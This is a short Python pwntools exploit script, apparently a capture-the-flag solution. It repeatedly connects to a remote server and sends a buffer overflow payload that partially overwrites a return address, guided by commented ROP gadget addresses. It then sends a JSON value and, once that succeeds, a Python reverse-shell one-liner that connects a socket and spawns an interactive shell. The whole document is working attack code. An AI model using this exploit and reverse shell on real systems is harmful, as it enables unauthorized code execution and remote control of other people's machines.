from pwn import *
import json

count=0
while True:
    print(count)
    count+=1
    r = remote("34.81.73.235", 10101)
    r.sendlineafter(b"text: ", b"meow")
    r.sendlineafter(b"document: ", b"abc")
    #0x00000000001aa0fd : pop r13 ; pop r14 ; pop r15 ; ret
    #0x00000000001a5053 : pop r13 ; pop r14 ; pop r15 ; ret
    r.sendlineafter(b"document: ", b"a"*0x12c + b"\x53")
    r.sendlineafter(b": ", json.dumps({"expand": 0x4EFA33}))
    #r.interactive()
    try:
        res = r.recv(timeout=5)
    except:
        r.close()
        continue
    if b'failed' in res:
        r.close()
        continue
    print("sendcommand")
    #r.sendline(b'import os\nos.system("cat /flag")\n'+b"#"+b"a"*1000000)
    r.sendline(b'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",13337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")')
    #print(r.recvall(timeout=5))
    #r.shutdown()
    r.interactive()
    r.close()
    break